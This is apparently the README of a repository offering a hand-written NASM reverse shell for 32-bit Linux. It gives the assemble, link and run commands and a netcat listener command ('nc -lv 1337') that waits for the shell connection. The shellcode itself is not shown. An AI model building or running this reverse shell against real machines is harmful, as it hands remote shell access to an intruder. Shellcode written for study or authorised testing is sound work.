# linux-i386-reverseshell
A intel 32bit reverse shell for linux I wrote in NASM assembly
<br/><br/>
**How to build**:
1. `nasm -f elf -o shellcodeUnlinked shellcode.asm`
2. `ld -m elf_i386 -o reverse_shell shellcodeUnlinked`
3. `./reverse_shell`

**Server setup**:
1. `nc -lv 1337`
2. wait for connection
